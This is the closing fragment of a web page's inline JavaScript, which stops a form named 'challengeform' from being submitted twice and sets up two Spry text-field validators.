  };
  gaia.forms = gaia.forms || {};
  gaia.forms.Form = function(formId) {
  this.form_ = document.getElementById(formId);
  this.formSubmitted_ = false;
  if (this.form_) {
  this.initForm_();
  }
  };
  gaia.forms.Form.prototype.initForm_ = function() {
  this.initSubmitListener_();
  };
  gaia.forms.Form.prototype.handleSubmit_ = function(e) {
  if (this.formSubmitted_) {
  e.preventDefault();
  } else {
  this.formSubmitted_ = true;
  }
  };
  gaia.forms.Form.prototype.initSubmitListener_ = function() {
  gaia_attachEvent(this.form_, 'submit',
  gaia.bind(this.handleSubmit_, this));
  };
  new gaia.forms.Form('challengeform');
  })();
var sprytextfield1 = new Spry.Widget.ValidationTextField("sprytextfield1", "integer", {useCharacterMasking:true});
var sprytextfield2 = new Spry.Widget.ValidationTextField("sprytextfield2");
</script>
  </body>
</html>